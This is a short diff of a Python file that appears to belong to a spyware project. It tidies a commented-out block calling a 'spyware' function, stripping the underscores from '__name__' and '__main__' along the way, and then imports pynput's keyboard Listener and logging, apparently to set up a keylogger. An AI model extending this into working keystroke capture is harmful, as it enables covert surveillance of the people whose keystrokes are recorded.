@@ -1,12 +1,9 @@
 # from Spyware import spyware
-
 # def main():
-#     print("UP")
-#     spyware()
-    
-# if __name__ == '__main__':
-#     main()    
-	
+# print("UP")
+# spyware()
+# if name == 'main':
+# main()
 from pynput.keyboard import Key, Listener
 import logging
  
